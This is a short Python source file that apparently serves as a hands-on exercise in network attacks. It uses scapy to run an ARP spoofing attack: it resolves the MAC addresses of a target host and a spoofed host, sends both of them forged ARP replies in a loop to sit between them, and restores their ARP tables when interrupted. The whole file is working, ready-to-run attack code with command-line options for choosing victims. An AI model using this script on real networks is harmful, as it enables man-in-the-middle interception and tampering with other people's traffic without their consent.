import scapy.all as scapy
from time import sleep
# from sys import stdout
import optparse as op

parser = op.OptionParser()
parser.add_option("-t", "--targetIP", dest="target_ip", help="enter the targeting ip")
parser.add_option("-s", "--spoofIP", dest="spoof_ip", help="enter the spoofing ip")
options = parser.parse_args()[0]


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
    arp_broadcast_request = broadcast / arp_request
    answered_list = scapy.srp(arp_broadcast_request, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc
    # print(answered_list[0][1].hwsrc)


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    # print(packet.show())
    # print(packet.summary())
    scapy.send(packet, verbose=False)


def restore(dest_ip, source_ip):
    dest_mac = get_mac(dest_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)


try:
    sent_packet_counts = 0
    while True:
        spoof(options.target_ip, options.spoof_ip)
        spoof(options.spoof_ip, options.target_ip)
        sent_packet_counts = sent_packet_counts + 2
        # print("[+] Sent two packets: " + str(sent_packet_counts))
        # print("\r[+] Packets Sent: " + str(sent_packet_counts)),#stores the results in buffer and prints output when the program quits

        print("\r[+] Packets Sent: " + str(sent_packet_counts),
              end="")  # stores the results in buffer and prints output when the program quits

        # stdout.flush()#with the help of these python will not store in buffer it will print the output without newline character
        # works only with python2.7 and below
        sleep(2)
except KeyboardInterrupt:
    print("\n[-] Spoofing Terminated Successfully\n")
    print("\n[-] Restoring ARP Tables\n")
    restore(options.target_ip, options.spoof_ip)
    restore(options.spoof_ip, options.target_ip)
    print("\n[-] Restored ARP Tables Successfully\n")
# get_mac("192.168.1.2")
